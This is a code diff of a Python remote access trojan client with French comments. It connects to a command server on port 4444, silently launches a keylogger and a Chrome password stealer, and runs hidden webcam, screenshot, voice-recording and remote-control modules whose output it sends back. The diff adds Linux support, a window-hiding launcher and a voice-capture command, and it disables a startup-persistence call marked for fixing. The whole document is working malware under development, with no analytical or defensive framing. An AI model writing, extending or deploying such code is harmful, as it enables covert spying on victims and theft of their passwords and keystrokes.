@@ -5,25 +5,44 @@ import threading
 import os
 import sys
 import time
-import ctypes
-import winreg
+import platform
 
-SERVER_IP = "192.168.206.1"
+IS_WINDOWS = platform.system() == "Windows"
+IS_LINUX = platform.system() == "Linux"
+
+if IS_WINDOWS:
+    import ctypes
+    import winreg
+
+
+SERVER_IP = "192.168.211.1"
 SERVER_PORT = 4444
+
+
 
 if getattr(sys, 'frozen', False):
     BASE_DIR = os.path.dirname(sys.executable)
 else:
     BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
-KEYLOGGER_EXE = os.path.join(BASE_DIR, "keylogger.exe")
-PASSWORD_EXE = os.path.join(BASE_DIR, "chrome_password.exe")
-WEBCAM_EXE = os.path.join(BASE_DIR, "web_cam.exe")
+
 KEYLOG_FILE = os.path.join(BASE_DIR, "keylogs.txt")
-REMOTE_EXE= os.path.join(BASE_DIR, "remote.exe")
-SCREENSHOT_EXE = os.path.join(BASE_DIR, "screenshot.exe")
 CAPTURE_DIR = os.path.join(BASE_DIR, "captures")
 SCREENSHOT_DIR = os.path.join(BASE_DIR, "screenshot")
+
+if IS_WINDOWS:
+    KEYLOGGER_EXE = os.path.join(BASE_DIR, "keylogger.exe")
+    PASSWORD_EXE = os.path.join(BASE_DIR, "chrome_password.exe")
+    WEBCAM_EXE = os.path.join(BASE_DIR, "web_cam.exe")
+    REMOTE_EXE = os.path.join(BASE_DIR, "remote.exe")
+    SCREENSHOT_EXE = os.path.join(BASE_DIR, "screenshot.exe")
+    VOICE_EXE = os.path.join(BASE_DIR, "voice_module.exe")
+else:
+    KEYLOGGER_EXE = os.path.join(BASE_DIR, "keylogger_linux")
+    WEBCAM_EXE = os.path.join(BASE_DIR, "web_cam")
+    REMOTE_EXE = os.path.join(BASE_DIR, "remote")
+    SCREENSHOT_EXE = os.path.join(BASE_DIR, "screenshot_linux")
+    VOICE_EXE = os.path.join(BASE_DIR, "voice_module")
 
 
 def hide_file(path):
@@ -73,6 +92,22 @@ def wait_for_file(file_path, timeout=10):
         time.sleep(1)
     return True
 
+# Lancer un exécutable si présent
+def safe_run(exe_path, args=None, silent=False):
+    if exe_path and os.path.exists(exe_path):
+        try:
+            if IS_WINDOWS:
+                subprocess.Popen([exe_path] + (args or []), creationflags=subprocess.CREATE_NO_WINDOW)
+            else:
+                subprocess.Popen([exe_path] + (args or []))
+            if not silent:
+                print(f"[+] Exécution de : {exe_path}")
+        except Exception as e:
+            print(f"[!] Erreur lors du lancement de {exe_path}: {e}")
+    else:
+        print(f"[!] Exécutable introuvable : {exe_path}")
+
+
 def handle_commands(client_socket):
     try:
         while True:
@@ -107,8 +142,9 @@ def handle_commands(client_socket):
             elif command == "remote":
                 print("[*] remote.exe est lancé !")
 
-                subprocess.Popen([REMOTE_EXE], creationflags=subprocess.CREATE_NO_WINDOW)
+                # subprocess.Popen([REMOTE_EXE], creationflags=subprocess.CREATE_NO_WINDOW)
                 # subprocess.run([REMOTE_EXE], check=True)
+                safe_run(REMOTE_EXE)
 
             elif command == "screenshot":
                 subprocess.run([SCREENSHOT_EXE], check=True)
@@ -120,9 +156,9 @@ def handle_commands(client_socket):
                         send_file(client_socket, latest, "screenshot")
                         os.remove(latest)
 
-
-            
-
+            elif command == "voice":
+                # subprocess.Popen([VOICE_EXE], creationflags=subprocess.CREATE_NO_WINDOW)
+                safe_run(VOICE_EXE)        
 
     except Exception as e:
         print(f"[Erreur] de connexion : {e}")
@@ -135,13 +171,19 @@ def main():
     #     if os.path.exists(exe):
     #         hide_file(exe)
 
-    add_to_startup(os.path.join(BASE_DIR, "rat_client.exe"))
+    # add_to_startup(os.path.join(BASE_DIR, "rat_client.exe")) ======> A CORRIGER 
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.connect((SERVER_IP, SERVER_PORT))
+        s.send(platform.system().encode())
 
-        subprocess.Popen([KEYLOGGER_EXE], creationflags=subprocess.CREATE_NO_WINDOW)
-        subprocess.run([PASSWORD_EXE], check=True)
+        
+        if IS_WINDOWS:
+            subprocess.Popen([KEYLOGGER_EXE], creationflags=subprocess.CREATE_NO_WINDOW)
+            subprocess.run([PASSWORD_EXE], check=True)
+        else:
+            subprocess.Popen([KEYLOGGER_EXE])
+        
 
         handle_commands(s)
 
